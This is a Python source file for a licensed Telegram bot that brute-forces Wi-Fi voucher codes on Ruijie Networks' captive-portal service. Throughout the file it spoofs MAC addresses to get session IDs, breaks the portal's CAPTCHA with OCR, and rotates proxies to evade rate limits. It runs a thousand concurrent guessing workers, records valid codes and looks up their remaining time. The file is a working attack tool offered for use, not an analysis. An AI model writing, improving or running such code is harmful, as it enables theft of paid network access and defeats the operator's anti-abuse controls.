import asyncio
import aiohttp
import json
import time
import random
import string
import re
import os
import sys
import datetime
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse
import ddddocr

# python-telegram-bot modules
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, InputFile
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# SOCKS proxy support
from aiohttp_socks import ProxyConnector

# ==================== CONFIGURATION ====================
# သင့်ရဲ့ GitHub မှ licenses.json ၏ Raw Link ကို ဤနေရာတွင် ထည့်ပါ
LICENSE_URL = "https://raw.githubusercontent.com/SmvpnVip/my-vpn-tool/main/licenses.json"
AUTH_CACHE_FILE = ".auth_cache"
PORTAL_URL_PATH = "portal_url_"
PROXY_FILE = "proxies.txt"

ADMIN_CONTACT = "@SmVPN789"

TIMEOUT_SEC = 15  
NUM_WORKERS = 1000  

# ANSI color codes
bcyan = "\033[1;36m"
bgreen = "\033[1;32m"
bred = "\033[1;31m"
yellow = "\033[33m"
reset = "\033[0m"

def show_banner():
    try:
        os.system('clear' if os.name == 'posix' else 'cls')
    except:
        pass
    print(f"{bcyan}="*55)
    print(f"   ⚡ RUIJIE  ASYNC EXTREME  ⚡   ")
    print(f"     Telegram@SmVPN789       ")
    print(f"{bcyan}="*55 + f"{reset}")

# ==================== AUTHENTICATION & TOKEN FETCHING ====================
def authenticate_user():
    show_banner()
    print("First-time Setup · Telegram ID Authentication")
    
    telegram_id = ""
    if os.path.exists(AUTH_CACHE_FILE):
        try:
            with open(AUTH_CACHE_FILE, "r") as f:
                telegram_id = f.read().strip()
        except:
            pass

    if not telegram_id:
        print("[*] Enter your Telegram ID once (will be remembered)")
        print("[*] Example: 123456789")
        telegram_id = input(f"{bcyan}[ID] Telegram ID: {reset}").strip()
        if telegram_id:
            with open(AUTH_CACHE_FILE, "w") as f:
                f.write(telegram_id)

    print("\nChecking authorization...")
    
    try:
        response = requests.get(LICENSE_URL, timeout=10)
        if response.status_code != 200:
            print(f"{bred}[x] Error connecting to license server.{reset}")
            sys.exit(1)
            
        licenses_list = response.json()
    except Exception as e:
        print(f"{bred}[x] Connection failed: {e}{reset}")
        sys.exit(1)

    matched_item = None
    for item in licenses_list:
        if str(item.get("user_id")) == str(telegram_id):
            matched_item = item
            break

    if not matched_item:
        print(f"{bred}[x] Access Denied: Telegram ID ({telegram_id}) not found in license list!{reset}")
        if os.path.exists(AUTH_CACHE_FILE):
            os.remove(AUTH_CACHE_FILE)
        sys.exit(1)

    expire_str = matched_item.get("expire_date")
    bot_token = matched_item.get("bot_token")
    
    expire_date = datetime.datetime.strptime(expire_str, "%Y-%m-%d %H:%M:%S")
    now = datetime.datetime.now()

    if now < expire_date:
        left = expire_date - now
        days = left.days
        hours, remainder = divmod(left.seconds, 3600)
        minutes, _ = divmod(remainder, 60)

        print(f"{bgreen}[+] Access Granted! (Verified){reset}")
        print(f"[*] Expires : {expire_str}")
        print(f"[*] Left    : {days}d {hours}h {minutes}m")
        print("="*55)
        time.sleep(2)
        return bot_token
    else:
        print(f"{bred}[x] Access Denied: License Expired on {expire_str}!{reset}")
        if os.path.exists(AUTH_CACHE_FILE):
            os.remove(AUTH_CACHE_FILE)
        sys.exit(1)

# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self, file_path: str):
        self.file_path = file_path
        self.proxies: list[str] = []
        self.bad_proxies: dict[str, float] = {}  
        self.index = 0
        self.lock = asyncio.Lock()
        self.load()

    def _normalize(self, proxy: str) -> str | None:
        proxy = proxy.strip()
        if not proxy:
            return None
        if not proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
            proxy = 'http://' + proxy
        return proxy

    def load(self):
        if os.path.exists(self.file_path):
            try:
                with open(self.file_path, 'r') as f:
                    raw = [line.strip() for line in f if line.strip()]
                self.proxies = [p for p in (self._normalize(r) for r in raw) if p]
            except Exception:
                self.proxies = []
        else:
            self.proxies = []
        self.bad_proxies.clear()
        self.index = 0

    def reload(self):
        self.load()

    def reset_all(self):
        self.proxies = []
        self.bad_proxies.clear()
        self.index = 0
        if os.path.exists(self.file_path):
            try:
                with open(self.file_path, 'w') as f:
                    f.write("")
            except:
                pass

    async def get_next(self) -> str | None:
        async with self.lock:
            if not self.proxies:
                return None
            
            current_time = time.time()
            expired_bads = [p for p, t in self.bad_proxies.items() if current_time - t > 30.0]
            for p in expired_bads:
                del self.bad_proxies[p]

            available = [p for p in self.proxies if p not in self.bad_proxies]
            if not available:
                self.bad_proxies.clear()
                available = self.proxies[:]
            
            proxy = available[self.index % len(available)]
            self.index += 1
            return proxy

    async def mark_bad(self, proxy: str | None):
        if not proxy:
            return
        async with self.lock:
            self.bad_proxies[proxy] = time.time()

    def stats(self) -> tuple[int, int]:
        total = len(self.proxies)
        current_time = time.time()
        active = sum(1 for p in self.proxies if p not in self.bad_proxies or (current_time - self.bad_proxies[p] > 30.0))
        return total, active

_proxy_manager: ProxyManager | None = None

def get_proxy_manager() -> ProxyManager:
    global _proxy_manager
    if _proxy_manager is None:
        _proxy_manager = ProxyManager(PROXY_FILE)
    return _proxy_manager

# ---------------- GLOBALS for OCR ----------------
_ocr_instance = None

def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance

# ---------------- PER-USER DATA ----------------
user_scanners = {}

def get_user_data(user_id: int):
    if user_id not in user_scanners:
        saved_url = None
        p_file = f"{PORTAL_URL_PATH}{user_id}.txt"
        if os.path.exists(p_file):
            try:
                with open(p_file, "r") as f:
                    saved_url = f.read().strip()
            except Exception:
                saved_url = None

        user_scanners[user_id] = {
            'mode': 'num6',
            'char_set': '012345678',
            'code_len': 6,
            'start_digit': None,
            'portal_url': saved_url,
            'plan': 'Premium / Unlimited',
            'expiry_status': 'Active',
            'stop_event': asyncio.Event(),
            'dash_update_event': asyncio.Event(),
            'task': None,
            'stats': {'tried':0, 'hits':0, 'expired':0, 'limits':0, 'start_time': time.time()},
            'valid_codes': [],
            'limit_codes': [],
            'tried_codes': set(),
            'recent_logs': [],
            'CURRENT_CODE': '----',
            'dash_msg_id': None,
            'menu_msg_id': None,
            'state': None,
        }
    return user_scanners[user_id]

# ---------------- UTILITIES ----------------
def generate_random_mac():
    return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])

def ocr_image_bytes_fast(image_bytes: bytes) -> str:
    try:
        ocr = get_ocr_instance()
        result = ocr.classification(image_bytes)
        return result.strip().upper()
    except Exception:
        return ""

async def solve_captcha_simple_async(session, captcha_url, headers, ud):
    try:
        if ud['stop_event'].is_set():
            return None
        current_url = f"{captcha_url}&_t={int(time.time() * 1000)}"
        async with session.get(current_url, headers=headers, ssl=False) as response:
            if response.status == 200:
                image_content = await response.read()
                if ud['stop_event'].is_set():
                    return None
                return await asyncio.to_thread(ocr_image_bytes_fast, image_content)
    except Exception:
        pass
    return None

async def get_sid_from_gateway(session, portal_url, user_id):
    ud = get_user_data(user_id)
    if ud['stop_event'].is_set():
        return None, None
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    try:
        u = urlparse(portal_url)
        query = parse_qs(u.query)
        mac = generate_random_mac()
        query['mac'] = [mac]
        spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))

        if ud['stop_event'].is_set():
            return None, None

        async with session.get(spoofed_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False) as r2:
            body = await r2.text()
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
            if match:
                final_url = urljoin(spoofed_url, match.group(1))
                if ud['stop_event'].is_set():
                    return None, None
                async with session.get(final_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False) as r3:
                    final_url = str(r3.url)
            else:
                final_url = str(r2.url)
            parsed_query = parse_qs(urlparse(final_url).query)
            sid = parsed_query.get('sessionId', parsed_query.get('sid', [None]))[0]
            if sid:
                return sid, mac
    except Exception:
        pass
    return None, None

def create_connector_for_proxy(proxy: str):
    return ProxyConnector.from_url(proxy, ssl=False)

async def fetch_balance(active_token: str, code: str, proxy: str) -> str:
    url = f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_token}'
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    }
    try:
        connector = create_connector_for_proxy(proxy)
        async with aiohttp.ClientSession(connector=connector) as s:
            async with s.get(url, headers=headers, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    inner = data.get('result', data)
                    profile_name = inner.get('profileName', 'N/A')
                    raw_total = inner.get('totalMinutes', 0)
                    total_minutes = abs(int(raw_total)) if str(raw_total).isdigit() else 0
                    hours = total_minutes // 60
                    minutes = total_minutes % 60
                    return f"🃏: {profile_name}, ⏰: {hours} hr {minutes} min"
                else:
                    return f"❌ HTTP {resp.status}"
    except Exception:
        return f"❌ Net Error"

async def check_balance(active_token, code, user_id, proxy_str):
    ud = get_user_data(user_id)
    balance_str = await fetch_balance(active_token, code, proxy_str)
    for item in ud['valid_codes']:
        if item['code'] == code:
            item['balance_str'] = balance_str
            break
    ud['recent_logs'].append(f"✅ HIT: {code} | {balance_str}")
    ud['dash_update_event'].set()

async def check_single_access_code(session, code, current_session_id, login_url,
                                   captcha_base_url, verify_url, headers, user_id, current_proxy):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    captcha_url = f"{captcha_base_url}?sessionId={current_session_id}"
    while not ud['stop_event'].is_set():
        auth_code = await solve_captcha_simple_async(session, captcha_url, headers, ud)
        if ud['stop_event'].is_set():
            return 'failed'
        if not auth_code or len(auth_code) < 2:
            await asyncio.sleep(0.01)
            continue

        v_payload = {"sessionId": current_session_id, "authCode": auth_code}
        try:
            if ud['stop_event'].is_set():
                return 'failed'
            async with session.post(verify_url, json=v_payload, headers=headers, timeout=TIMEOUT_SEC, ssl=False) as v_resp:
                if ud['stop_event'].is_set():
                    return 'failed'
                if v_resp.status != 200:
                    if v_resp.status in [403, 429, 502, 503, 504]:
                        await pm.mark_bad(current_proxy)
                    continue
                v_data = await v_resp.json()
                if not v_data.get("success"):
                    continue

                if ud['stop_event'].is_set():
                    return 'failed'

                l_payload = {"accessCode": code, "sessionId": current_session_id, "apiVersion": 1, "authCode": auth_code}
                async with session.post(login_url, json=l_payload, headers=headers, timeout=TIMEOUT_SEC, ssl=False) as l_resp:
                    ud['stats']['tried'] += 1
                    l_text = (await l_resp.text()).lower()

                    if '"success":true' in l_text:
                        ud['stats']['hits'] += 1
                        if not any(item['code'] == code for item in ud['valid_codes']):
                            ud['valid_codes'].append({'code': code, 'balance_str': '...fetching...'})
                        ud['dash_update_event'].set()

                        token_match = re.search(r'token=([^&\s"\'<>]+)', l_text)
                        if token_match:
                            active_token = token_match.group(1)
                            asyncio.create_task(check_balance(active_token, code, user_id, current_proxy))
                        return 'hit'
                    elif "expired" in l_text:
                        ud['stats']['expired'] += 1
                        return 'expired'
                    return 'failed'
        except Exception:
            await pm.mark_bad(current_proxy)
            return 'failed'
    return 'failed'

async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    while not ud['stop_event'].is_set():
        proxy = await pm.get_next()
        if proxy is None:
            await asyncio.sleep(0.5)
            continue
        try:
            proxy_connector = create_connector_for_proxy(proxy)
            async with aiohttp.ClientSession(connector=proxy_connector, connector_owner=True) as session:
                current_session_id = None
                codes_checked = 0
                while not ud['stop_event'].is_set() and codes_checked < NUM_WORKERS:
                    if current_session_id is None or codes_checked >= NUM_WORKERS:
                        sid, mac = await get_sid_from_gateway(session, ud['portal_url'], user_id)
                        if ud['stop_event'].is_set():
                            break
                        if sid is None:
                            await pm.mark_bad(proxy)
                            break
                        current_session_id = sid
                        codes_checked = 0

                    if ud['stop_event'].is_set():
                        break

                    if ud['mode'] == "custom" and ud['start_digit'] is not None:
                        body_chars = random.choices(ud['char_set'], k=ud['code_len'] - 1)
                        code = ud['start_digit'] + ''.join(body_chars)
                    else:
                        code = ''.join(random.choices(ud['char_set'], k=ud['code_len']))

                    if code in ud['tried_codes']:
                        continue
                    ud['tried_codes'].add(code)

                    ud['CURRENT_CODE'] = code
                    res = await check_single_access_code(session, code, current_session_id,
                                                    login_url, captcha_base_url, verify_url,
                                                    headers, user_id, proxy)
                    if ud['stop_event'].is_set():
                        break
                    if res == 'failed':
                        break
                    codes_checked += 1
        except Exception:
            await pm.mark_bad(proxy)
            await asyncio.sleep(0.5)

async def live_dashboard_updater(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    while not ud['stop_event'].is_set():
        if ud['dash_msg_id'] is None:
            await asyncio.sleep(0.5)
            continue
        try:
            stats = ud['stats']
            elapsed = time.time() - stats['start_time']
            speed_cpm = (stats['tried'] / elapsed) * 60 if elapsed > 0 else 0
            proxy_total, proxy_active = pm.stats()

            hit_list = [f"{item['code']} {item.get('balance_str', '')}" for item in ud['valid_codes']]
            hit_str = "\n".join(hit_list) if hit_list else "None yet"

            text = (
                f"⚡ Scanner Running ⚡\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"⚙️ Mode: `{ud['mode']}`\n"
                f"🏹 Tried: {stats['tried']:,}\n"
                f"🎯 Current Code: {ud['CURRENT_CODE']}\n"
                f"🔥 Hits: {stats['hits']}\n"
                f"⚡ Speed: {speed_cpm:.1f} c/m\n"
                f"🔀 Proxies: {proxy_active}/{proxy_total}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🔥 **Hit Codes**:\n{hit_str}\n"
            )
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(text="🛑 Stop Scanner", callback_data="stop_scan")]
            ])
            await context.bot.edit_message_text(chat_id=user_id, message_id=ud['dash_msg_id'], text=text, reply_markup=keyboard)
        except Exception:
            pass

        try:
            await asyncio.wait_for(ud['dash_update_event'].wait(), timeout=1.0)
            ud['dash_update_event'].clear()
        except asyncio.TimeoutError:
            pass

async def finalize_scanner_stop(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    try:
        stats = ud['stats']
        elapsed = time.time() - stats['start_time']
        speed_cpm = (stats['tried'] / elapsed) * 60 if elapsed > 0 else 0
        proxy_total, proxy_active = pm.stats()

        hit_list = [f"{item['code']} {item.get('balance_str', '')}" for item in ud['valid_codes']]
        hit_str = "\n".join(hit_list) if hit_list else "None yet"

        final_text = (
            f"🔴 Scanner Stopped/Finished\n\n"
            f"🟢 Total Tried: {stats['tried']:,}\n"
            f"🟢 Hits: {stats['hits']}\n"
            f"⚡ Final Speed: {speed_cpm:.1f} c/m\n"
            f"🔀 Proxies: {proxy_active}/{proxy_total}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📋 **All Hit Codes**:\n{hit_str}\n"
        )

        if ud['dash_msg_id']:
            try:
                await context.bot.edit_message_text(chat_id=user_id, message_id=ud['dash_msg_id'], text=final_text)
            except Exception:
                await context.bot.send_message(chat_id=user_id, text=final_text)
        else:
            await context.bot.send_message(chat_id=user_id, text=final_text)

        timestamp_str = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"hits_{user_id}_{timestamp_str}.txt"
        file_content = "\n".join([f"{item['code']} | {item.get('balance_str', '')}" for item in ud['valid_codes']])
        if not file_content.strip():
            file_content = "No hits found."

        with open(filename, "w", encoding="utf-8") as f:
            f.write(file_content)

        with open(filename, "rb") as f:
            await context.bot.send_document(
                chat_id=user_id,
                document=InputFile(f, filename=filename),
                caption="📋 Hit Codes Report"
            )
        
        if os.path.exists(filename):
            os.remove(filename)
    except Exception as e:
        print(f"Error in finalize: {e}")

async def run_user_scanner(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    ud = get_user_data(user_id)
    login_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    captcha_base_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/image"
    verify_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/verify"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Origin": "https://portal-as.ruijienetworks.com",
    }
    ud['dash_update_event'].clear()
    tasks = [asyncio.create_task(live_dashboard_updater(context, user_id))]
    for i in range(NUM_WORKERS):
        tasks.append(asyncio.create_task(worker(i, login_url, captcha_base_url, verify_url, headers, user_id)))
    ud['task'] = asyncio.current_task()
    try:
        await asyncio.gather(*tasks)
    except asyncio.CancelledError:
        pass
    finally:
        await finalize_scanner_stop(context, user_id)

# ==================== KEYBOARDS & MENUS ====================
def get_main_menu_markup(user_id: int):
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(text="🔗 Session URL ထည့်ရန်", callback_data="btn_update_portal"),
            InlineKeyboardButton(text="🔍 Code ရှာရန်", callback_data="btn_start_scanner")
        ],
        [
            InlineKeyboardButton(text="📦 သိမ်းထားသော Code", callback_data="btn_saved_codes")
        ],
        [
            InlineKeyboardButton(text="⚙️ Scanner Mode ရွေးရန်", callback_data="btn_mode_menu")
        ]
    ])

# ==================== HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    url_status = "သတ်မှတ်ပြီး" if ud['portal_url'] else "မသတ်မှတ်ရသေးပါ"

    text = (
        f"👤 User ID: `{user_id}`\n"
        f"📋 Plan: `{ud['plan']}`\n"
        f"⏳ သက်တမ်းအခြေအနေ:\n`{ud['expiry_status']}`\n\n"
        f"🔗 Session URL: `{url_status}`\n"
        f"👨‍💻 Admin: {ADMIN_CONTACT}"
    )
    msg = await update.message.reply_text(text, reply_markup=get_main_menu_markup(user_id), parse_mode=ParseMode.MARKDOWN)
    ud['menu_msg_id'] = msg.message_id

async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    data = query.data

    if data == "btn_update_portal":
        ud['state'] = 'waiting_for_portal_url'
        await query.message.edit_text("🌐 **Portal (Session) URL ကို ပို့ပေးပါ။**", parse_mode=ParseMode.MARKDOWN)

    elif data == "btn_mode_menu":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(text="Number 6", callback_data="set_mode_num6"),
             InlineKeyboardButton(text="Number 7", callback_data="set_mode_num7"),
             InlineKeyboardButton(text="Number 8", callback_data="set_mode_num8")],
            [InlineKeyboardButton(text="Number 9", callback_data="set_mode_num9")],
            [InlineKeyboardButton(text="Abc 6", callback_data="set_mode_abc6"),
             InlineKeyboardButton(text="Mix 6", callback_data="set_mode_mix6"),
             InlineKeyboardButton(text="Mix 7", callback_data="set_mode_mix7")],
            [InlineKeyboardButton(text="Mix 8", callback_data="set_mode_mix8"),
             InlineKeyboardButton(text="Mix 9", callback_data="set_mode_mix9")],
            [InlineKeyboardButton(text="Custom Start", callback_data="set_mode_custom")],
            [InlineKeyboardButton(text="⬅️ ပင်မမီနူးသို့", callback_data="admin_back")]
        ])
        await query.message.edit_text("⚙️ **ရှာဖွေမည့် Code ပုံစံ (Mode) ကို ရွေးပါ**", reply_markup=keyboard, parse_mode=ParseMode.MARKDOWN)

    elif data.startswith("set_mode_"):
        selected_mode = data.split("set_mode_")[1]
        if selected_mode == "num6":
            ud['mode'] = "num6"
            ud['char_set'] = "012345678"
            ud['code_len'] = 6
            ud['start_digit'] = None
        elif selected_mode == "num7":
            ud['mode'] = "num7"
            ud['char_set'] = "012345678"
            ud['code_len'] = 7
            ud['start_digit'] = None
        elif selected_mode == "num8":
            ud['mode'] = "num8"
            ud['char_set'] = "012345678"
            ud['code_len'] = 8
            ud['start_digit'] = None
        elif selected_mode == "num9":
            ud['mode'] = "num9"
            ud['char_set'] = "012345678"
            ud['code_len'] = 9
            ud['start_digit'] = None
        elif selected_mode == "abc6":
            ud['mode'] = "abc6"
            ud['char_set'] = "abcdefghijkmnpqrstuvwxyz"
            ud['code_len'] = 6
            ud['start_digit'] = None
        elif selected_mode == "mix6":
            ud['mode'] = "mix6"
            ud['char_set'] = "2345678" + "abcdefghijkmnpqrstuvwxyz"
            ud['code_len'] = 6
            ud['start_digit'] = None
        elif selected_mode == "mix7":
            ud['mode'] = "mix7"
            ud['char_set'] = "2345678" + "abcdefghijkmnpqrstuvwxyz"
            ud['code_len'] = 7
            ud['start_digit'] = None
        elif selected_mode == "mix8":
            ud['mode'] = "mix8"
            ud['char_set'] = "2345678" + "abcdefghijkmnpqrstuvwxyz"
            ud['code_len'] = 8
            ud['start_digit'] = None
        elif selected_mode == "mix9":
            ud['mode'] = "mix9"
            ud['char_set'] = "2345678" + "abcdefghijkmnpqrstuvwxyz"
            ud['code_len'] = 9
            ud['start_digit'] = None
        elif selected_mode == "custom":
            ud['mode'] = "custom"
            ud['char_set'] = "012345678"
            ud['code_len'] = 6
            ud['state'] = 'waiting_for_digit'
            await query.message.edit_text("🔢 **စတင်မည့် ဂဏန်းတစ်လုံးကို ပို့ပေးပါ (ဥပမာ - 7)**", parse_mode=ParseMode.MARKDOWN)
            return

        url_status = "သတ်မှတ်ပြီး" if ud['portal_url'] else "မသတ်မှတ်ရသေးပါ"
        text = (
            f"✅ Mode ကို `{ud['mode']}` သို့ ပြောင်းလဲပြီးပါပြီ။\n\n"
            f"👤 User ID: `{user_id}`\n"
            f"📋 Plan: `{ud['plan']}`\n"
            f"⏳ သက်တမ်း: `{ud['expiry_status']}`\n"
            f"🔗 Session URL: `{url_status}`"
        )
        await query.message.edit_text(text, reply_markup=get_main_menu_markup(user_id), parse_mode=ParseMode.MARKDOWN)

    elif data == "btn_start_scanner":
        if not ud['portal_url']:
            await query.message.edit_text("❌ ကျေးဇူးပြု၍ Session URL အရင်ထည့်ပါ။", reply_markup=get_main_menu_markup(user_id))
            return
        ud['stop_event'].clear()
        ud['stats'] = {'tried':0, 'hits':0, 'expired':0, 'limits':0, 'start_time': time.time()}
        ud['valid_codes'] = []
        ud['tried_codes'] = set()
        ud['recent_logs'] = []
        ud['CURRENT_CODE'] = '----'
        ud['dash_msg_id'] = query.message.message_id
        asyncio.create_task(run_user_scanner(context, user_id))

    elif data == "btn_saved_codes":
        codes = [f"{item['code']} | {item.get('balance_str', '')}" for item in ud['valid_codes']]
        code_str = "\n".join(codes) if codes else "သိမ်းဆည်းထားသော Code မရှိသေးပါ။"
        await query.message.edit_text(f"📦 **သိမ်းထားသော Code များ:**\n\n{code_str}", reply_markup=get_main_menu_markup(user_id), parse_mode=ParseMode.MARKDOWN)

    elif data == "admin_back":
        url_status = "သတ်မှတ်ပြီး" if ud['portal_url'] else "မသတ်မှတ်ရသေးပါ"
        text = (
            f"👤 User ID: `{user_id}`\n"
            f"📋 Plan: `{ud['plan']}`\n"
            f"⏳ သက်တမ်း: `{ud['expiry_status']}`\n"
            f"🔗 Session URL: `{url_status}`\n"
            f"👨‍💻 Admin: {ADMIN_CONTACT}"
        )
        await query.message.edit_text(text, reply_markup=get_main_menu_markup(user_id), parse_mode=ParseMode.MARKDOWN)

    elif data == "stop_scan":
        ud['stop_event'].set()
        ud['dash_update_event'].set()

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    state = ud.get('state')
    text = update.message.text.strip()

    if state == 'waiting_for_portal_url':
        if not text.startswith("http"):
            await update.message.reply_text("❌ မှန်ကန်သော HTTP URL ပို့ပါ။")
            return
        ud['portal_url'] = text
        ud['state'] = None
        p_file = f"{PORTAL_URL_PATH}{user_id}.txt"
        with open(p_file, "w") as f:
            f.write(text)
        await update.message.reply_text("✅ Session URL သိမ်းဆည်းပြီးပါပြီ။", reply_markup=get_main_menu_markup(user_id))

    elif state == 'waiting_for_digit':
        ud['start_digit'] = text[0] if len(text) > 0 else '0'
        ud['state'] = None
        await update.message.reply_text(f"✅ Custom Start Digit = `{ud['start_digit']}` သတ်မှတ်ပြီးပါပြီ။", reply_markup=get_main_menu_markup(user_id), parse_mode=ParseMode.MARKDOWN)

# ==================== MAIN ====================
def main():
    # 1. ဤနေရာတွင် User ID တစ်ခုတည်း တောင်းခံပြီး GitHub ရှိ licenses.json နှင့် ချိန်ကိုက်စစ်ဆေးမည်
    bot_token = authenticate_user()

    # 2. စစ်ဆေးမှု အောင်မြင်ပါက licenses.json ထဲမှ Bot Token ဖြင့် Bot ကို အလိုအလျောက် စတင်မည်
    app = Application.builder().token(bot_token).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    print("Bot is running with python-telegram-bot...")
    app.run_polling()

if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        pass
